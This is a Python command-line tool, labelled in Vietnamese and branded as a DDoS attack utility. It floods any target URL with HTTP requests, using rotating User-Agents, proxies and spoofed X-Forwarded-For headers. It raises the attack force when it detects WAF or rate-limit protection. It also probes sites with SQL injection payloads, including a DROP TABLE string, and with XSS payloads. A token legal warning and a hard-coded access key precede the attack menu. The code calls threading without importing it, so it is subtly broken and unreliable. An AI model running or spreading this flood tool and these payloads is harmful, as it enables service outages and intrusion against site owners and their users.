#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ©️ Quang Bảo 2025 - All Rights Reserved

import requests
import time
import urllib.parse
import os
import random
import hashlib
import json
from datetime import datetime
import whois
from bs4 import BeautifulSoup
import asyncio
import aiohttp
import psutil
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme
from rich.text import Text

# ASCII Art đẹp mắt
ASCII_ART = """
[bold magenta]
   _____       _       _     _            
  / ____|     (_)     | |   | |           
 | |  __ _   _ _ _ __ | |__ | |__   ___ _ __ 
 | | |_ | | | | | '_ \\| '_ \\| '_ \\ / _ \\ '__|
 | |__| | |_| | | | | | | | | |_) |  __/ |   
  \\_____|\\__,_|_|_| |_|_| |_|_.__/ \\___|_|   
[/]
[bold cyan]   CYBERSTRIKE PRO © Quang Bảo 2025[/]
[bold green]   Nhiệm vụ: Bảo vệ và kiểm tra an ninh mạng[/]
"""

# Khởi tạo console với theme màu
custom_theme = Theme({
    "info": "bold cyan",
    "warning": "bold yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "bold magenta",
})
console = Console(theme=custom_theme)

# Dấu nhắc kiểu hacker
def hacker_prompt(message, default=None):
    prompt_text = f"[bold magenta]┌──(quangbao㉿attack)-[~]\n└─$[/] [bold cyan]{message}[/]"
    return Prompt.ask(prompt_text, default=default)

# Cảnh báo pháp lý
def display_legal_warning():
    console.print(Panel(
        """
[bold red]CẢNH BÁO PHÁP LÝ[/]
Công cụ này chỉ được sử dụng cho mục đích kiểm tra bảo mật hợp pháp với sự cho phép của chủ sở hữu hệ thống.
Việc sử dụng trái phép có thể vi phạm pháp luật và gây hậu quả nghiêm trọng.
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        style="error"
    ))
    if not Confirm.ask("[error]Bạn đồng ý với điều khoản sử dụng?[/]"):
        console.print("[error]HỆ THỐNG: Thoát chương trình [error][✗][/]")
        exit(1)

# Kiểm tra khóa xác thực
def check_auth_key():
    console.print("[info]CHÀO MỪNG BẠN ĐÃ ĐẾN VỚI [bold magenta]BÌNH NGUYÊN VÔ TẬN...[/] [success][⚡][/]")
    key = hacker_prompt("Nhập key xác thực: ")
    if key != "baoddos":
        console.print("[error]LỖI: Key không đúng! Thoát chương trình. [error][✗][/]")
        exit(1)
    console.print("[success]XÁC THỰC: Key hợp lệ! Truy cập hệ thống. [success][✓][/]")

# Kiểm tra tính toàn vẹn tệp
def check_file_integrity():
    global EXPECTED_HASH
    EXPECTED_HASH = None
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                console.print(f"[warning]HỆ THỐNG: Tạo mã băm mới: [bold magenta]{file_hash}[/] [success][✓][/]")
            elif file_hash != EXPECTED_HASH:
                console.print(f"[error]LỖI NGHIÊM TRỌNG: Tệp bị thay đổi! Thoát. [bold red][✗][/]")
                exit(1)
    except Exception as e:
        console.print(f"[error]LỖI NGHIÊM TRỌNG: Kiểm tra tính toàn vẹn thất bại: [bold red]{str(e)}[/] [error][✗][/]")
        exit(1)

# Xóa màn hình
def clear_screen():
    os.system('clear')  # Codespaces dùng 'clear' thay vì 'cls'

# Hiệu ứng tải
def loading_animation(message, duration):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[info]{message}[/]", total=100)
        for i in range(0, 101, 25):
            progress.update(task, advance=25, description=f"[info]{message} [{i}%]...[/]")
            time.sleep(duration / 4)
        progress.update(task, description=f"[success]{message} [100%]! [✓][/]")

# Danh sách User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

# Tạo header ngẫu nhiên
def generate_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'DNT': '1',
        'Sec-Fetch-Mode': random.choice(['navigate', 'same-origin', 'cors']),
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script']),
    }

# Danh sách proxy (thủ công cho Codespaces)
PROXY_LIST = [
    "http://proxy1.example.com:8080",  # Thay bằng proxy thật nếu có
    "http://proxy2.example.com:8080",
]

def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# Bộ đếm toàn cục
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []

# Xác thực URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: [bold red]{e}[/]")

# Đánh giá mức độ bảo mật mục tiêu
def assess_target_security(url):
    security_level = "TRUNG BÌNH"
    recommended_threads = 50  # Giảm cho Codespaces
    recommended_requests = 50

    try:
        response = requests.head(url, headers=generate_random_headers(), timeout=5)
        headers = response.headers
        waf_indicators = ['cloudflare', 'akamai', 'sucuri']
        server = headers.get('Server', '').lower()
        cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)
        rate_limit = 'X-RateLimit-Limit' in headers or response.status_code in (429, 403)

        if cdn_waf_detected or rate_limit:
            security_level = "CAO"
            recommended_threads = 100
            recommended_requests = 100
        else:
            security_level = "THẤP"
            recommended_threads = 25
            recommended_requests = 25

        console.print(f"[info]HỆ THỐNG: Đánh giá bảo mật: [bold magenta]{security_level}[/], Luồng: [bold cyan]{recommended_threads:,}[/], Yêu cầu: [bold cyan]{recommended_requests:,}[/] [success][✓][/]")
    except Exception as e:
        console.print(f"[warning]HỆ THỐNG: Không thể đánh giá bảo mật: [bold yellow]{str(e)}[/]. Sử dụng giá trị mặc định. [warning][⚠][/]")

    return security_level, recommended_threads, recommended_requests

# Điều chỉnh luồng theo khả năng Codespaces
def adjust_threads_for_device(num_threads, num_requests):
    cpu_count = psutil.cpu_count()
    ram_available = psutil.virtual_memory().available / (1024 * 1024)  # MB
    max_threads = min(num_threads, cpu_count * 10, int(ram_available / 2))  # Giới hạn cho Codespaces
    max_requests = min(num_requests, 500)
    console.print(f"[info]HỆ THỐNG: Điều chỉnh: [bold cyan]{max_threads:,}[/] luồng, [bold cyan]{max_requests:,}[/] yêu cầu dựa trên [bold magenta]{cpu_count}[/] CPU và [bold magenta]{ram_available:.0f}[/] MB RAM. [success][✓][/]")
    return max_threads, max_requests

# Giám sát tài nguyên
def monitor_resources():
    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    console.print(f"[info]HỆ THỐNG: CPU: [bold cyan]{cpu_usage}%[/], RAM: [bold cyan]{ram_usage}%[/] [success][✓][/]")
    return cpu_usage, ram_usage

# Tấn công CLOG bất đồng bộ
async def clog_attack_async(url, requests_per_thread, duration, semaphore):
    global success_count, error_count, response_times
    async with aiohttp.ClientSession() as session:
        start_time = time.time()
        max_retries = 3
        for _ in range(requests_per_thread):
            if time.time() - start_time >= duration:
                break
            async with semaphore:
                retries = 0
                while retries < max_retries:
                    try:
                        headers = generate_random_headers()
                        proxy = get_random_proxy()
                        start_request = time.time()
                        async with session.get(url, headers=headers, proxy=proxy, timeout=3) as response:
                            console.print(f"[error]CLOG ATTACK: Mã trạng thái: [bold green]{response.status}[/] [success][✓][/] ©2025 Quang Bao - DDos Attack")
                            with manager:
                                success_count += 1
                                response_times.append((time.time() - start_request) * 1000)
                            break
                    except aiohttp.ClientError as e:
                        retries += 1
                        if retries == max_retries:
                            with manager:
                                error_count += 1
                            console.print(f"[error]CLOG ATTACK: Thất bại sau {max_retries} lần thử: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack")
                        else:
                            await asyncio.sleep(0.1)
                    except Exception as e:
                        with manager:
                            error_count += 1
                        console.print(f"[error]CLOG ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack")
                        break
                await asyncio.sleep(random.uniform(0.0001, 0.0005))

# Quét lỗ hổng web
async def scan_vulnerabilities(url):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        try:
            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --"]
            for payload in sql_payloads:
                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in ["sql syntax", "mysql"]):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "High",
                            "description": f"Potential SQL Injection with payload: [bold magenta]{payload}[/]",
                            "recommendation": "Use prepared statements."
                        })
                        break
        except Exception as e:
            console.print(f"[warning]VULN SCAN: SQL Injection scan failed: [bold yellow]{str(e)}[/] [warning][✗][/]")

        try:
            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
            for payload in xss_payloads:
                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                    text = await response.text()
                    if payload in text:
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "Medium",
                            "description": f"Reflected XSS with payload: [bold magenta]{payload}[/]",
                            "recommendation": "Encode all output."
                        })
                        break
        except Exception as e:
            console.print(f"[warning]VULN SCAN: XSS scan failed: [bold yellow]{str(e)}[/] [warning][✗][/]")

    return vulnerabilities

# Hiển thị báo cáo lỗ hổng
def display_vulnerability_report(vulnerabilities):
    table = Table(title="[info]BÁO CÁO LỖ HỔNG BẢO MẬT[/]", style="info")
    table.add_column("Loại", style="highlight")
    table.add_column("Mức độ", style="warning")
    table.add_column("Mô tả")
    table.add_column("Khuyến nghị", style="success")
    for vuln in vulnerabilities:
        table.add_row(vuln["type"], vuln["severity"], vuln["description"], vuln["recommendation"])
    console.print(table)
    if not vulnerabilities:
        console.print("[success]VULN SCAN: Không phát hiện lỗ hổng! [✓][/]")
    hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")

# Lưu báo cáo tấn công
def save_attack_report(validated_url, num_threads, requests_per_thread, duration, success_count, error_count, total_time, avg_response_time):
    report = {
        "url": validated_url,
        "threads": num_threads,
        "requests_per_thread": requests_per_thread,
        "duration": duration,
        "success_count": success_count,
        "error_count": error_count,
        "total_time": total_time,
        "avg_response_time": avg_response_time,
        "timestamp": datetime.now().isoformat()
    }
    with open("attack_history.json", "a") as f:
        json.dump(report, f, indent=4)
        f.write("\n")
    console.print("[success]HỆ THỐNG: Báo cáo đã được lưu vào attack_history.json [success][✓][/]")

# Hiển thị lịch sử tấn công
def display_attack_history():
    try:
        with open("attack_history.json", "r") as f:
            history = [json.loads(line) for line in f if line.strip()]
        table = Table(title="[info]LỊCH SỬ TẤN CÔNG[/]", style="info")
        table.add_column("Thời gian", style="highlight")
        table.add_column("Mục tiêu", style="success")
        table.add_column("Thành công", style="success")
        table.add_column("Thất bại", style="error")
        for report in history:
            table.add_row(
                report["timestamp"],
                report["url"],
                f"{report['success_count']:,}",
                f"{report['error_count']:,}"
            )
        console.print(table)
        hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")
    except FileNotFoundError:
        console.print("[warning]HỆ THỐNG: Chưa có lịch sử tấn công! [warning][⚠][/]")
        hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")

# Hiển thị menu chính với ASCII
def display_menu():
    clear_screen()
    console.print(ASCII_ART)
    table = Table(title="[info]MENU CHÍNH[/]", style="info")
    table.add_column("ID", style="highlight")
    table.add_column("Chức năng", style="success")
    table.add_column("Mô tả")
    table.add_row("1", "[bold green]TẤN CÔNG CLOG[/]", "Tấn công làm nghẽn bằng yêu cầu tốc độ cao")
    table.add_row("2", "[bold green]QUÉT LỖ HỔNG[/]", "Quét lỗ hổng web nâng cao")
    table.add_row("3", "[bold green]LỊCH SỬ TẤN CÔNG[/]", "Xem lịch sử các chiến dịch tấn công")
    table.add_row("4", "[bold green]THOÁT[/]", "Thoát chương trình")
    console.print(table)

# Hàm chạy tấn công CLOG bất đồng bộ
async def run_clog_attack(url, num_threads, requests_per_thread, duration):
    semaphore = asyncio.Semaphore(50)  # Giới hạn 50 yêu cầu đồng thời cho Codespaces
    tasks = [clog_attack_async(url, requests_per_thread, duration, semaphore) for _ in range(num_threads)]
    await asyncio.gather(*tasks)

# Hàm chính
def main():
    display_legal_warning()
    check_file_integrity()
    check_auth_key()
    console.print(ASCII_ART)  # Hiển thị ASCII khi bắt đầu

    while True:
        try:
            display_menu()
            choice = hacker_prompt("Nhập lựa chọn (1-4): ")

            if choice == "4":
                console.print("[warning]HỆ THỐNG: Thoát chương trình [success][✓][/]")
                exit(0)

            if choice == "3":
                display_attack_history()
                continue

            input_url = hacker_prompt("Nhập URL hoặc IP mục tiêu: ")
            if not input_url:
                console.print("[error]LỖI: URL/IP không được để trống! [error][✗][/]")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
                console.print(f"[success]HỆ THỐNG: Mục tiêu đã khóa: [bold cyan]{validated_url}[/] [success][✓][/]")
            except ValueError as e:
                console.print(f"[error]LỖI: {e} [error][✗][/]")
                continue

            loading_animation("Khóa mục tiêu", 2)

            if choice == "2":
                console.print("[info]HỆ THỐNG: Bắt đầu quét lỗ hổng... [success][⚡][/]")
                loading_animation("Quét lỗ hổng web", 3)
                loop = asyncio.get_event_loop()
                vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
                display_vulnerability_report(vulnerabilities)
                continue

            # Nhập tham số tấn công
            num_threads = int(hacker_prompt("Nhập số luồng (1-100, mặc định: 10): ", default="10"))
            requests_per_thread = int(hacker_prompt("Nhập số yêu cầu mỗi luồng (1-500, mặc định: 50): ", default="50"))
            duration = int(hacker_prompt("Nhập thời gian tấn công (giây, mặc định: 30): ", default="30"))

            num_threads = min(max(1, num_threads), 100)
            requests_per_thread = min(max(1, requests_per_thread), 500)
            duration = max(1, duration)

            num_threads, requests_per_thread = adjust_threads_for_device(num_threads, requests_per_thread)

            console.print("[info]HỆ THỐNG: Đang đánh giá bảo mật... [success][⚡][/]")
            loading_animation("Đánh giá bảo mật", 2)
            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)

            if security_level == "THẤP":
                num_threads = min(recommended_threads, num_threads // 2)
                requests_per_thread = min(recommended_requests, requests_per_thread // 2)
                attack_strategy = "TẤN CÔNG NHẸ"
            elif security_level == "TRUNG BÌNH":
                attack_strategy = "LỰC LƯỢNG VỪA PHẢI"
            else:
                num_threads = max(recommended_threads, num_threads)
                requests_per_thread = max(recommended_requests, requests_per_thread)
                attack_strategy = "LỰC LƯỢNG TỐI ĐA"

            panel = Panel(
                f"""
[bold cyan]CHIẾN LƯỢC: [bold magenta]CLOG ATTACK[/]
[bold cyan]Mục tiêu: [bold green]{validated_url}[/]
[bold cyan]Luồng: [bold green]{num_threads:,}[/]
[bold cyan]Yêu cầu/Luồng: [bold green]{requests_per_thread:,}[/]
[bold cyan]Thời gian: [bold green]{duration}[/] giây
[bold cyan]Chiến lược: [bold magenta]{attack_strategy}[/]
[bold cyan]Tổng lượt đánh: [bold green]{num_threads * requests_per_thread:,}[/]
[bold cyan]Bản quyền: [bold yellow]©2025 Quang Bao - DDos Attack[/]
                """,
                title="[info]THÔNG TIN TẤN CÔNG[/]",
                style="info"
            )
            console.print(panel)
            confirm = Confirm.ask("[error]HỆ THỐNG: Xác nhận tấn công [success][?][/]")
            if not confirm:
                console.print("[warning]HỆ THỐNG: Hủy tấn công [warning][⚠][/]")
                continue

            console.print("[error]HỆ THỐNG: Khởi động tấn công... [success][⚡][/]")
            loading_animation("Khởi động hệ thống", 3)

            global success_count, error_count, response_times
            success_count = 0
            error_count = 0
            response_times = []
            start_time = time.time()

            resource_monitor = threading.Thread(target=monitor_resources)
            resource_monitor.start()

            loop = asyncio.get_event_loop()
            loop.run_until_complete(run_clog_attack(validated_url, num_threads, requests_per_thread, duration))

            resource_monitor.join()
            total_time = time.time() - start_time
            avg_response_time = sum(response_times) / len(response_times) if response_times else 0
            max_response_time = max(response_times) if response_times else 0
            min_response_time = min(response_times) if response_times else 0

            report = Panel(
                f"""
[bold cyan]BÁO CÁO CHIẾN DỊCH: [bold magenta]CLOG ATTACK[/]
[bold cyan]Tổng lượt đánh: [bold green]{num_threads * requests_per_thread:,}[/]
[bold cyan]Thành công: [bold green]{success_count:,} ({(success_count/(num_threads * requests_per_thread)*100):.1f}%)[/] [success][✓][\\]
[bold cyan]Thất bại: [bold red]{error_count:,} ({(error_count/(num_threads * requests_per_thread)*100):.1f}%)[/] [error][✗][\\]
[bold cyan]Tổng thời gian: [bold green]{total_time:.2f}[/] giây
[bold cyan]Thời gian phản hồi trung bình: [bold green]{avg_response_time:.2f}[/]ms
[bold cyan]Hiệu suất đỉnh: [bold green]{max_response_time:.2f}[/]ms
[bold cyan]Độ trễ tối thiểu: [bold green]{min_response_time:.2f}[/]ms
[bold cyan]Lượt đánh/giây: [bold green]{(num_threads * requests_per_thread)/total_time:.0f}[/]
[bold cyan]Bản quyền: [bold yellow]©2025 Quang Bao - DDos Attack[/]
                """,
                title="[info]BÁO CÁO TẤN CÔNG[/]",
                style="success"
            )
            console.print(report)
            save_attack_report(validated_url, num_threads, requests_per_thread, duration, success_count, error_count, total_time, avg_response_time)

        except KeyboardInterrupt:
            console.print("[warning]HỆ THỐNG: Tấn công bị dừng bởi người dùng [warning][⚠][/]")
            exit(0)
        except Exception as e:
            console.print(f"[error]HỆ THỐNG: Lỗi nghiêm trọng: [bold red]{str(e)}[/] [error][✗][/]")
            exit(1)

if __name__ == "__main__":
    main()
